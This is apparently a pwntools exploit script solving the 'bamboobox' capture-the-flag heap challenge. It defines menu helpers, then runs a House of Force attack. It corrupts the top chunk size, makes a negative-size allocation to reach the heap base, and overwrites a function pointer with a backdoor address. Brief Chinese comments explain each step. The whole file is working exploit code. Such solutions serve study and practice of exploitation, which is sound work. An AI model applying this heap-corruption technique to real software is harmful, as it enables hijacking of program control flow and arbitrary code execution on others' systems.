from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h', '-p', '85'])
p = process('./bamboobox')

def show():
    p.recvuntil('Your choice:')
    p.send(b'1'.ljust(8, b'\x00'))
    
def add(size, content):
    p.recvuntil('Your choice:')
    p.send(b'2'.ljust(8, b'\x00'))
    p.recvuntil('Please enter the length of item name:')
    p.send(bytes(str(size), 'utf-8').ljust(8, b'\x00'))
    p.recvuntil('Please enter the name of item:')
    p.send(content)
    
def change(index, size, content):
    p.recvuntil('Your choice:')
    p.send(b'3'.ljust(8, b'\x00'))
    p.recvuntil('Please enter the index of item:')
    p.send(bytes(str(index), 'utf-8').ljust(8, b'\x00'))
    p.recvuntil('Please enter the length of item name:')
    p.send(bytes(str(size), 'utf-8').ljust(8, b'\x00'))
    p.recvuntil('Please enter the new name of the item:')
    p.send(content)

def remove(index):
    p.recvuntil('Your choice:')
    p.send(b'4'.ljust(8, b'\x00'))
    p.recvuntil('Please enter the index of item:')
    p.send(bytes(str(index), 'utf-8').ljust(8, b'\x00'))
    
def quit():
    p.recvuntil('Your choice:')
    p.send(b'5'.ljust(8, b'\x00'))

backdoor = 0x400D49

add(0xD0, b'A' * 0xD0)              # chunk siz = 0xE0

change(0, 0xD0 + 0x10, b'A' * 0xD0 + p64(0) + p64(0xffffffffffffffff)) # 设置top chunk的size为0xffffffffffffffff

add(-(0x100) - 0x10, b'a')          # 向前分配chunk到heap base

add(0x10, b'o' * 0x10)              # 将fun指针分配出来

change(2, 0x10, p64(backdoor) * 2)  # 修改fun指向backdoor

quit()                              # 触发漏洞

# gdb.attach(p)
p.interactive()